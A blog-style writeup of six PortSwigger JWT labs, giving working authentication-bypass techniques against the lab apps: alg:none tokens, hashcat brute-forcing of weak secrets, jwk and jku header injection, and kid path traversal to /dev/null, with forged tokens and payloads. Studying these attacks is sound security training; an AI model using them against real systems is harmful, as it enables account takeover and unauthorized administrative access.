---
title: "JWT"
date: 2026-10-01
draft: false
description: "Attacking JWT"
tags:
  - Labs
  - portswigger
categories:
  - writeups
  - tutorials
---

## JWT

JSON Web Token (JWT) is widely recognized as an alternative to session-based authentication. It is commonly used to convey authentication information between web services. A notable feature of JWT is its message integrity, which enables the authentication of both the sender and the receiver. In other words, both the client and the server can verify the message.

To illustrate its utility, consider a mobile banking application. Instead of employing sessions — which can introduce security vulnerabilities and consume server resources due to the maintenance of session tokens in memory — the application uses JWT. When a user logs in, the server issues a JWT embedded with a set of claims that identify and authorize the user. These claims might include the user ID, roles, or other non-sensitive attributes. This token then oversees and authenticates subsequent user requests, streamlining the authentication process. This approach not only reduces the burden on server resources but also aligns with the stateless nature of RESTful APIs.

A JWT is made up of three parts:

- **Header** : Contains the token type (usually JWT) and the signing algorithm.

- **Payload** : Contains the actual data that is transmitted.

- **Signature** : Protects the integrity of the token.

To generate the signature, both the header and the payload need to be encoded using base64 URL encoding. After encoding, the two parts are concatenated using a dot (`.`).

### JWT Security Considerations

When approaching JWT, it is essential to understand various security implications:

- **Signature Secret Key** : The signature of a JWT uses a secret key. If a weak key is chosen, it is vulnerable to brute force attacks.
- **XSS Vulnerability** : Similar to other session tokens, JWTs can be stolen if there is an XSS vulnerability in the application. One mitigation is to transmit the JWT via a cookie protected with the `HTTP Only` flag. However, this introduces a new risk: with the automatic submission of cookies during cross-origin requests, the JWT would then become vulnerable to CSRF (cross-site request forgery) attacks.
- **Storage Vulnerabilities** : Storing JWTs in local or session storage exposes them to theft if an XSS vulnerability exists in the application.
- **Expiration** : Tokens that never expire provide a prolonged window of opportunity for attackers. If they manage to steal such a token, they can misuse it indefinitely.
- **Encoding versus Encryption** : JWTs are base64-encoded by default, not encrypted. A common mistake developers make is storing sensitive data in a JWT without encrypting it first.

`https://github.com/wallarm/jwt-secrets`

The link above is a wordlist used to brute-force the JWT secret key.

Command for brute-forcing the JWT secret:

```bash
hashcat -a 0 -m 16500 <token> <wordlist>
```

*Intro adapted from Web Hacking Arsenal by Rafay Baloch.*

## Lab 1 - JWT authentication bypass via unverified signature

**Goal** : Modify the session token to gain access to the `/admin` panel and delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

```http
GET /my-account?id=wiener HTTP/2
Host: 0a61005c045641cf80f38f0500c20006.web-security-academy.net
Cookie: session=eyJraWQiOiJlNWY5ZmRjZS1iODEzLTRkN2QtOTc0My0yMDYxMTRiNWIyNjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTc5MTgwNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.J9k_1OfOoH9-M4ULMua0pkWqTuQRA4gNsTwhc-suMKjFiV9HWI2UVJRTn7LhbhSaVaJWA2OEiZHIuYrFeb3vKGam89cJN8iMUpM1_u8zYi4JGXBh5_GdU20fSXJ1iZHu1nn_wWc3r6PzbO-29Ep8QZ9ZO2RJnM98OoFh_NLK4QIt3KWX-Ad9ZhGGbuuBQJ0gx_XNbFdws7EmuCafAL8j3PVuCJN_6yYgVM4e1zOnvO3edEZwjxbd4YZoETXKUv4QWYWsR8K2R4TelzR65-A8jLfzA9F8hU6_st_pUoZGnwBx9o2QWEQuZGhUlgL5i-_6t0wYWIlwWWDdbOflMmqMtg
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a61005c045641cf80f38f0500c20006.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

In this request we can already see the JWT token, which is:

`eyJraWQiOiJlNWY5ZmRjZS1iODEzLTRkN2QtOTc0My0yMDYxMTRiNWIyNjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTc5MTgwNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.J9k_1OfOoH9-M4ULMua0pkWqTuQRA4gNsTwhc-suMKjFiV9HWI2UVJRTn7LhbhSaVaJWA2OEiZHIuYrFeb3vKGam89cJN8iMUpM1_u8zYi4JGXBh5_GdU20fSXJ1iZHu1nn_wWc3r6PzbO-29Ep8QZ9ZO2RJnM98OoFh_NLK4QIt3KWX-Ad9ZhGGbuuBQJ0gx_XNbFdws7EmuCafAL8j3PVuCJN_6yYgVM4e1zOnvO3edEZwjxbd4YZoETXKUv4QWYWsR8K2R4TelzR65-A8jLfzA9F8hU6_st_pUoZGnwBx9o2QWEQuZGhUlgL5i-_6t0wYWIlwWWDdbOflMmqMtg`

**Exploitation :**

First, we check whether the JWT signature is actually verified. We can add as many characters as we want to the signature part and see if the token is still accepted. In the example below, we added four `w` characters to the end of the signature and the server still accepted it:

`eyJraWQiOiJlNWY5ZmRjZS1iODEzLTRkN2QtOTc0My0yMDYxMTRiNWIyNjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTc5MTgwNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.J9k_1OfOoH9-M4ULMua0pkWqTuQRA4gNsTwhc-suMKjFiV9HWI2UVJRTn7LhbhSaVaJWA2OEiZHIuYrFeb3vKGam89cJN8iMUpM1_u8zYi4JGXBh5_GdU20fSXJ1iZHu1nn_wWc3r6PzbO-29Ep8QZ9ZO2RJnM98OoFh_NLK4QIt3KWX-Ad9ZhGGbuuBQJ0gx_XNbFdws7EmuCafAL8j3PVuCJN_6yYgVM4e1zOnvO3edEZwjxbd4YZoETXKUv4QWYWsR8K2R4TelzR65-A8jLfzA9F8hU6_st_pUoZGnwBx9o2QWEQuZGhUlgL5i-_6t0wYWIlwWWDdbOflMmqMtgwwww`

Since the signature is not checked, we change the value of `sub` to `administrator` and then visit the `/admin` path.

![sub rename](/images/JWT/rename.png)

Fortunately, it works and we can see the option to delete users.

![Admin Route](/images/JWT/Lab1User.png)

Then we delete the `carlos` user by visiting the `/admin/delete?username=carlos` path.

![carlos delete](/images/JWT/carlosuser_Delete.png)

And the lab is solved.

## Lab 2 - JWT authentication bypass via flawed signature verification

**Goal** : Modify the session token to gain access to the `/admin` panel and delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

1. Check whether the JWT signature is verified.

```http
GET /admin HTTP/2
Host: 0a8b00a203ac1286802076ee004f007e.web-security-academy.net
Cookie: session=eyJraWQiOiI2OWNiMjEyMC00M2MyLTQ0ZWYtOTJiMC00NDA2ZTJjOWRiNmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTc5NDU5NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.CK4cyJXCYQ3CU2OHhCyfwvUjl8U1tfoLBoeXu0UnPuOfHRNIWN_a5bdpgwLhwhw491LmFLfEreHXw4oBu63Q0vTYFSQE0Bhg_gWM6Z9elalmmME-oTqfSHMT3rWEif9etRQsdAJ0tB4Dqemz3aXW2wA1Xh48hqbnhov373BCotwzLt-WnwpYIK2VPjk0MaYoWjnSxw0I7TOWBzyS9FR_W0nshP9ya7jok0OvszQk2iZyYUEEtCWq17mRJJTrh9F7n3cALVLk2HCbJtR1O5IW_OkBNKp-h32Utq_xAXaUia9hNW4JZpgTl4SsoxRxPCQe6gChQ7vDnRJHBLq_0d8WTwwww
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8b00a203ac1286802076ee004f007e.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

We can see the JWT token in the `Cookie` header. When we add `wwww` characters to the signature, the request still works.

So, like in Lab 1, we try changing the `sub` value to `administrator` and sending a request to `/admin`, but this time it doesn't work.

So we have to figure out another way.

2. Check if the application accepts an unsigned JWT using the `none` algorithm.

We change the header of the JWT:

```json
{
    "kid": "69cb2120-43c2-44ef-92b0-4406e2c9db6c",
    "alg": "none"
}
```

We set `"alg": "none"` and delete the signature part of the JWT:

`eyJraWQiOiI2OWNiMjEyMC00M2MyLTQ0ZWYtOTJiMC00NDA2ZTJjOWRiNmMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTc5NDU5NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.`

Note : Always keep the trailing `.` after the payload — it represents the now-empty signature.

![none_alg](/images/JWT/Lab2none_alg.png)

And we can see it works — the page shows the option to delete `carlos` at `/admin/delete?username=carlos`.

We just need to request that path.

![delete](/images/JWT/Lab2_delete.png)

And the lab is solved.

## Lab 3 - JWT authentication bypass via weak signing key

**Goal** : Brute-force the website's secret key, craft an administrator JWT, and delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

We follow the same checks as in the previous labs:

1. Check if the JWT signature is verified.
2. Check if the application accepts an unsigned (`none` algorithm) JWT.

Both of them didn't work — the techniques we used in the previous two labs are not enough here.

3. Check for a weak signing key / brute-forceable secret key. This is only possible when the token is signed with a symmetric algorithm (e.g. HS256), where the server signs and verifies the token with the same shared secret. If that secret is weak, we can brute-force it offline and forge our own tokens.

**Exploitation :**

We brute-force the signing key using hashcat with mode `16500` (JWT):

```bash
hashcat -a 0 -m 16500 <token> <wordlist>
```

The wordlist we used is `https://github.com/wallarm/jwt-secrets`.

The tool found the secret: `secret1`.

![hashcat output](/images/JWT/lab3hashcatoutput.png)

The secret must be base64-encoded before it can be used as a symmetric key:

![base64 encode](/images/JWT/lab3outputbase64.png)

Then, in the JWT Editor extension, we create a new symmetric key with the encoded secret and generate it:

![generate key](/images/JWT/lab3keygen.png)

We sign the token (with `sub` changed to `administrator`) using our new key:

![sign token](/images/JWT/lab3signing.png)

Finally, we use the forged token to delete the user `carlos` via `/admin/delete?username=carlos`:

![delete carlos](/images/JWT/lab3carlosdelete.png)

And the lab is solved.

## Lab 4 - JWT authentication bypass via jwk header injection

**Goal** : Access the admin panel at `/admin`, then delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

We can see the JWT token in the `Cookie` header as always:

`eyJraWQiOiI5MmJkMjc4Mi02YTdhLTQ5YTEtYjQ0Yi0zMjY5ZTA5Zjg3NmEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTk1MjA5MSwic3ViIjoid2llbmVyIn0.nxfz_b-x4MvvtBnXdhm6Y9MKP3c8uukTWhzrlr_R8AQswITc4Y3uHdEBPBFQqZqfsI_Bd8vSX8zeLFTZE8k44l8_jOBc29Ga5NoIDFD15gYYCBT62IlwkVyvJCskaDL4By-WIraQNSPh1EQDSBO5o9L3APQ5vj3omnOef7piNEA6wMFw90FxkTsuCOOvKKU6PU0wdOgE6yI4EGTWZOA5dpxM3YIWePc-YVBtOcQ3GHJAaeDKZq2rY4OToJXgeRaSmXnCVmB6MJMcxrDd8ysHfRrP6H6ZGSxBnjSOGY5TPeG355i99iU4JOshdxBTO9veQY8TQ4nMRNUBIUqZKM49rw`

We follow the same checks as before:

1. Check if the JWT signature is verified.
2. Check if the application accepts an unsigned (`none` algorithm) JWT.

Both of them didn't work.

3. Check for a weak signing key / brute-forceable secret key (must be symmetric). This token is signed with RS256 (asymmetric), so brute-forcing does not apply here.
4. Check for `jwk` header injection.

**Theory :**

The `jwk` (JSON Web Key) header embeds a public key directly inside the JWT header. With RSA (asymmetric) signing, the server normally uses a pre-configured public key to verify signatures that were made with the corresponding private key. The public key can only *verify* a signature, while the private key is required to *sign*.

However, if the server naively trusts the `jwk` key supplied in the token header and uses it to verify the signature, we can generate our own RSA key pair, embed our public key in the `jwk` header, and sign the token with our own private key. The server will then verify the signature using our embedded public key and accept the token.

**Exploitation :**

We use the `JWT Editor` Burp extension.

![JWT Editor](/images/JWT/jwt_editor.png)

First, we generate our own RSA key pair with `New RSA Key`:

![Generate RSA](/images/JWT/generate_RSA.png)

Then we change `"sub": "wiener"` to `"sub": "administrator"` and click the Attack button (Embed JWK). We can see that a new `jwk` header is injected into the token:

```json
"jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "a2c6a011-4fe8-4bd0-8cd5-bc87eff699ce",
    "n": "xV4F0JhGjKdgRe135oPhHgwEJeo8OBJSRFu5KCNLFaJv3srYBuZObUsYkG1r_fr8MsIuY0fUhShwWqkf4uZR2y63-g3TfvoR4-Rrce2FLm4JyRVS77vpChcTMaiF6XPLn1jkM-nQ82TpqBjN-9v71gWT0BYiZpIn90vInjUi-UQNXMN3wzG9KQzYhB-o4yy8X9tdoK0ykn2crAc3O9z5ehBOXX_GHR0pd02P3EHI9oneu_ItloSTrYRip1jBllDArDptFkHHDJIU7is5qJHxwv0XMdZyvZ1emiwRtg1MPjS5zQ2X77jZUjI0bGwgzy5pybmI5R4kIZbzxrQin8IGHw"
}
```

Then we hit send and we get the admin interface.

![admin panel](/images/JWT/admin_panel.png)

We delete the user `carlos` via `/admin/delete?username=carlos`:

![user delete](/images/JWT/user_delete.png)

And the lab is solved.

## Lab 5 - JWT authentication bypass via jku header injection

**Goal** : Access the admin panel at `/admin`, then delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

We can see the JWT token as usual:

`eyJraWQiOiJlMmY2MTMzMS1iZjYwLTQ4YzMtYTQxOS1jMWRmMzQ3NWVhNjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTk1NTQ0NCwic3ViIjoid2llbmVyIn0.iq4ywEmx_RgfWqSa84x6k9jg2KNd6adnGesNPxcUGp2Fr4aMBI7G_9oVfne0St3UxJDlEWMPOnly6jwe_YsZ52IK4YRFFZdW_S-gBPizDAQV7ioNTHSozbs6f_01d7CrXa1IIVd96Eiyr53w_8vAoLm-tP0Y1jP8C5ppjTvGsrIPYRwCYAJ-OOi1GGts9sCk8Uaa5uFvFwMA1-J2OFm3U6cvWJq766czcV7ZmAliAc3YmZs7YzDCQWweUfLH3Un8VvWlAXjraH42eETLT3KFmbKRSkFCX1nRfxd8SdKOM4Yp5Uil5gNfnQXGZx4YSsMTWLfcc6osqinU1cjWZjA4Kg`

We follow the same checks as before:

1. Check if the JWT signature is verified.
2. Check if the application accepts an unsigned (`none` algorithm) JWT.

Both of them didn't work.

3. Check for a weak signing key / brute-forceable secret key (must be symmetric).
4. Check for `jwk` header injection.
5. Check if the application accepts an arbitrary `jku` header.

**Theory :**

The `jku` (JWK Set URL) header points to a URL from which the server fetches a JWK Set — a collection of public keys — to verify the signature. If the server does not validate that this URL belongs to a trusted domain, we can host our own JWK Set on a server we control (the exploit server), put our public key in it, and sign the token with our own private key.

An RSA key pair consists of two keys that work together: a **public key** (shared with anyone; it can only *verify* a signature) and a **private key** (kept secret; it is used to *sign*). When we generate an RSA key in the JWT Editor, both keys are created, and the key is assigned a `kid` (Key ID) — a unique identifier for that key.

In this attack, two things must match:

1. The `kid` of our generated public key (as shown in the JWT Editor) is placed in the JWT header.
2. The JWK Set we host on the exploit server contains our public key **with that same `kid`**.

When the server receives the token, it reads the `jku` header, fetches our JWK Set from the exploit server, and looks up the key whose `kid` matches the `kid` in the token header. Since they match, the server uses our public key to verify the signature — which we created with our own private key.

**Exploitation :**

Steps of the attack:

Generate our RSA key pair => host the public key (with its `kid`) on the exploit server => modify the JWT header to include `"jku": "<exploit-server-url>"` and set `kid` to our public key's kid value, with `sub : administrator` => sign the JWT using our private key.

**RSA Key Generation :**

![Generate RSA](/images/JWT/generate_RSA.png)

Note the `kid` value of the generated key — this is the `kid` we will put in the JWT header later.

**Host the public key on the exploit server & Store :**

![exploit server](/images/JWT/exploit_server.png)

Copy the public key (JWK) from the JWT Editor into the `keys` array of the JWK Set served by the exploit server — it must keep the same `kid`.

> Note : The JWK Set JSON field must be named `keys` (plural) — in the screenshot above it was mistakenly written as `key`, which does **not** work. Only `keys` will be recognized by the server.

Example of the correct JWK Set served by the exploit server:

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "<our-generated-public-key-kid>",
            "n": "<our-generated-public-key-modulus>"
        }
    ]
}
```

**Modify the JWT :**

1. In the token header, set the `kid` parameter to the `kid` value of our generated public key.
2. Add the `jku` parameter pointing to the exploit server URL where our JWK Set is hosted.
3. In the payload, change `sub` to `administrator`.

The modified header looks like this:

```json
{
    "kid": "<our-generated-public-key-kid>",
    "jku": "<exploit-server-url>",
    "alg": "RS256"
}
```

And the payload:

```json
{
    "iss": "portswigger",
    "exp": 1791955444,
    "sub": "administrator"
}
```

![kid & sub change](/images/JWT/kid&sub_change.png)

**Sign the JWT using our private key :**

![signing](/images/JWT/siging.png)

When we send that request we get the admin interface and the `carlos` user delete path.

![attack success](/images/JWT/attack_success.png)

And the lab is solved.

## Lab 6 - JWT authentication bypass via kid header path traversal

**Goal** : Access the admin panel at `/admin`, then delete the user `carlos`.

**Credentials** : `wiener:peter`

**Analysis :**

We can see the JWT token as follows:

`eyJraWQiOiIwOTBmZDgxMS01MjBmLTRhOTAtOTk0Ny0yMWRlNWQ1ZWEyM2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTk2MTY5Mywic3ViIjoid2llbmVyIn0.EeSUgVN6Jgmy0xZ00qOJoUfF1ORg9kMnpBGIKqvPm4w`

We follow the same checks as before:

1. Check if the JWT signature is verified.
2. Check if the application accepts an unsigned (`none` algorithm) JWT.

Both of them didn't work.

3. Check for a weak signing key / brute-forceable secret key (must be symmetric).
4. Check for `jwk` header injection.
5. Check if the application accepts an arbitrary `jku` header.
6. Path traversal using the `kid` parameter.

**Theory :**

The `kid` (Key ID) header tells the server which key was used to sign the token. If the server uses the `kid` value directly as a file path to load the key from the filesystem (e.g. `/opt/keys/{kid}`) without sanitizing it, we can use path traversal (`../../`) to point the server at a file whose contents we know — in this lab, `/dev/null`, which is an empty file. If we then sign our token with a symmetric key matching those contents (empty, i.e. a single null byte in base64: `AA==`), the server will accept it.

**Exploitation :**

Modify the JWT: change `sub` to `administrator` and set the `kid` parameter to `../../../../../../dev/null`:

![kid parameter](/images/JWT/lab6kidparameter.png)

Generate a symmetric key and put `AA==` in the `k` parameter:

![symmetric key](/images/JWT/lab6symmetric.png)

Use the key to sign the token and send the request:

![signing](/images/JWT/lab6signing.png)

We can see the admin panel is exposed:

![admin panel exposed](/images/JWT/adminpanelExpose.png)

We delete the user `carlos` via `/admin/delete?username=carlos`:

![attack success](/images/JWT/lab6att_succ.png)

And the lab is solved.

## Reference

For a real-world style challenge that chains the same JWT `kid` path traversal technique with an HLS playlist LFI, check out the YesWeHack Dojo writeup: [Streamcore – JWT kid Path Traversal & HLS LFI to Sensitive Data Exposure](/posts/yeswehack-streamcore/).
